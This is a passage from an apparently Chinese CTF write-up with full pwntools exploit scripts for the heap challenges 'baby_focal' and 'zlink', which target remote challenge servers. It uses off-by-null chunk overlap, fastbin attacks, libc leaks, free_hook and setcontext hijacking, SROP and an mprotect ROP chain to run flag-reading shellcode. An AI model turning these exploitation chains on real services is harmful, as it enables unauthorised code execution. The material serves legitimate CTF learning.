        mov edx, 4
        mov eax, edi
        syscall
        exit:
        xor edi, edi
        mov eax, 231
        syscall'''
        )
    guess='\x5d\x96'
    while(True):
        #sh=process('./baby_focal')
        #guess='\x5d'+chr(int(raw_input(':'),16))
        sh=remote('115.28.187.226',32435)
        sh.sendlineafter('input your name: ','velta')
        add(0,0x40)
        free(0)
        for i in range(7):
            add(0,0x250)
            free(0)
        for i in range(7):
            add(0,0x120)
            free(0)
        for i in range(7):
            add(0,0x60)
            free(0)
        add(0,0x60)
        add(1,0x120)
        add(2,0x120)
        add(3,0x20)
        edit(0,p64(0)*13+p64(0x261))
        free(1)
        add(1,0x250)
        edit(1,'\x00'*0x120+p64(0)+p64(0x131)+'\n')
        edit(2,p64(0)*22+p64(0)+p64(0x71)+'\n')
        free(2)
        add(2,0x60)
        free(2)
        edit(1,'\x00'*0x120+p64(0)+p64(0x71)+p64(0x404060)+'\n')    
        free(3)
        add(2,0x60)
        add(3,0x60)
        add(1,0x10)
        edit(3,'\x80'+'\n')
        #pause()
        free(1)
        add(1,0x20)
        edit(3,'\x80'+'\n')
        edit(1,guess+'\n')
        edit(3,p64(0)*2+'\n')
        add(1,0x60)
        try:
            edit(3,p64(0)*2+'\n')
            add(1,0x60)
            edit(1,'\x00'*3+'\x00'*0x30+p64(0xfbad1887)+p64(0)*3+'\x00'+'\n')
        except:
            sh.close()
            continue
        libc_base=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x1eb980
        print(hex(libc_base))
        free_hook=libc_base+0x1EEB28
        free_hook2=free_hook & 0xfffffffffffff000
        pop_rdi=0x401b23
        pop_rsi=0x401b21
        pop_rdx=libc_base+0x11c371
        gadget_addr=libc_base+0x154930
        mprotect=libc_base+0x11BB00
        setcontext=libc_base+0x00000000000580DD
        puts_plt=0x401130
        puts_got=0x403F80
        read_addr=0x401160
        edit(3,p64(free_hook)+p64(0x20)+'\n')
        edit(1,p64(puts_plt)+'\n')
        edit(3,p64(puts_got)+p64(0x20)+'\n')
        free(1)
        sh.recvuntil(']\n')
        puts_addr=u64(sh.recv(6).ljust(8,'\x00'))
        print(hex(puts_addr))
        edit(3,p64(free_hook-0x110)+p64(0x150)+'\n')
        frame=SigreturnFrame()
        frame.rsp = free_hook2
        frame.rdi = 0
        frame.rsi = free_hook2
        frame.rdx = 0x2000
        frame.rip = read_addr
        payload=p64(0)+p64(free_hook-0x100)+p64(0)*4+p64(setcontext)+str(frame)[0x28:0x100]+p64(0)+p64(gadget_addr)
        edit(1,payload+'\n')
        free(1)
        layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(0x2000)+p64(0)+p64(pop_rdx)+p64(7)+p64(0)+p64(mprotect)+p64(free_hook2+8*10)
        sh.send(layout+shellcode)
        sh.interactive()
###  zlink
漏洞点在于序号大于9的堆块分配后写入时存在off by null。我们先在fast
bin中布置足够的堆块，使得总大小大于0x510，然后利用分配0xf8和0x500的选项触发fastbin
consolidate。从而形成0x510大小堆块，用来制造堆块重叠的堆块，0x100大小堆块这样的布局。我们可以利用中间堆块来off by
null修改0x100堆块的prev_inuse位以及pre size字段，之后free即可造成堆块重叠。
重叠之后可以先切分unsorted bin堆块，利用残留的fd泄露出libc基址。然后fastbin attack分配堆块到main
arena中，size字段通过堆块地址的最高非0字节伪造，但当该字节为0x55时会报错，需要爆破到为0x56的情况。此时我们可以修改top
chunk到free hook上方。最后通过重复分配堆块，直到我们能够修改free
hook为setcontext。用之前分配的大量堆块构造srop的payload即可，然后也是用orw的shellcode读出flag。
exp:
    from pwn import *
    context.log_level='debug'
    context.arch="amd64"
    def add(index,size,content):
        sh.sendafter(':','1')
        sh.sendafter(':',str(index))
        sh.sendafter(':',str(size))
        sh.sendafter(':',content)
    def edit(index,content):
        sh.sendafter(':','6')
        sh.sendafter(':',str(index))
        sh.sendafter(':',content)
    def free(index):
        sh.sendafter(':','2')
        sh.sendafter(':',str(index))
    def show(index):
        sh.sendafter(':','5')
        sh.sendafter(':',str(index))
        sh.recvuntil('Content : ')
    def alloc():
        sh.sendafter(':','4')
    shellcode = asm('''
        sub rsp, 0x800
        push 0x67616c66
        mov rdi, rsp
        xor esi, esi
        mov eax, 2
        syscall
        cmp eax, 0
        js failed
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edx, eax
        mov rsi, rsp
        mov edi, 1
        mov eax, edi
        syscall
        jmp exit
        failed:
        push 0x6c696166
        mov edi, 1
        mov rsi, rsp
        mov edx, 4
        mov eax, edi
        syscall
        exit:
        xor edi, edi
        mov eax, 231
        syscall'''
        )
    #sh=process('./zlink')
    #pause()
    sh=remote('115.28.187.226',22435)
    for i in range(10):
        add(i,0x70,'a')
    add(10,0x40,'a')
    add(11,0x70,'a')
    for i in range(12):
        free(i)
    alloc()
    add(0,0x20,'a')
    add(1,0x40,'a')
    add(2,0x60,'a')
    free(15)
    add(10,0x38,'a')
    edit(10,'a'*0x30+p64(0x580+0x50))
    free(14)
    add(3,0x70,'a'*8)
    show(3)
    sh.recv(8)
    libc_base=u64(sh.recv(6).ljust(8,'\x00'))-0x3c5018
    print(hex(libc_base))
    free_hook=libc_base+0x3C67A8#-0xb58
    free_hook2=free_hook & 0xfffffffffffff000
    read_addr=libc_base+0xf7350#0x00000000000F7350
    setcontext=libc_base+0x47B85
    arena=libc_base+0x3C4B35-8
    pop_rdi=libc_base+0x21112
    pop_rsi=libc_base+0x202f8
    pop_rdx=libc_base+0x1b92
    mprotect=libc_base+0x101870
    free(0)
    for i in range(7):
        add(i+3,0x70,'a')
    add(11,0x6f,'a')
    add(12,0x5f,'a')
    add(12,0x40,'a')
    add(13,0x40,'a')
    free(13)
    free(12)
    free(1)
    add(0,0x40,p64(arena))
    add(1,0x40,p64(arena))
    add(0,0x40,p64(arena))
    add(1,0x48,'\x00'*3+p64(0)*7+p64(free_hook-0xb58)[:6])
    add(2,0x30,'a')
    for i in range(22):
        add(2,0x70,'a')
    add(6,0x20,'a')
    add(5,0x20,'a')
    add(4,0x40,'\x00')
    frame=SigreturnFrame()
    frame.rsp = free_hook2
    frame.rdi = 0
    frame.rsi = free_hook2
    frame.rdx = 0x2000
    frame.rip = read_addr
    payload=str(frame)
    add(3,0x70,payload[0x50:0x50+0x60])
    add(2,0x60,'\x00'*0x48+p64(setcontext))
    #pause()
    free(4)
    layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(0x2000)+p64(pop_rdx)+p64(7)+p64(mprotect)+p64(free_hook2+8*8)
    sh.send(layout+shellcode)
    sh.interactive()